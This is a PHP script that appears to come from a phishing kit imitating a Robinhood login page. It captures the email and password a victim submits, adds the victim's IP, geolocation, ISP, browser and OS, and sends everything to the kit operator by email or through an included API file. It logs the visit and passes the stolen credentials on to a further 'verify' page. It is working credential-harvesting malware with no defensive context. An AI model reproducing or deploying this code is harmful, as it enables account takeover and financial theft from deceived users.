<?php
include'../main.php';
include'../get_setting.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "ROBINHOOD LOGIN [".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
<p>
<b>===================[ ROBINHOOD LOGIN ]===================</b><br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['password'].'<br>
<b>===================[ DEVICE INFO ]===================</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
User Agent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / BR : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Time Login : '.$date.'<br>
<b>===================[ SPM55 - ROBINHOOD ]===================</b>
</p>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: ROBINHOOD LOGIN <'.$sender_mail.'>' . "\r\n";
include'api.php';
mail($email_result, $subject, $message, $headers);
tulis_file("../admin/result/total_login.txt", $ip);
}else{
include'api.php';
include'server.php';
tulis_file("../admin/result/total_login.txt", $ip);
}
echo "<form id='boyxd' method='POST' action='../verify'><input type='hidden' name='email' value='".$_POST['email']."'><input type='hidden' name='pass_log' value='".$_POST['password']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>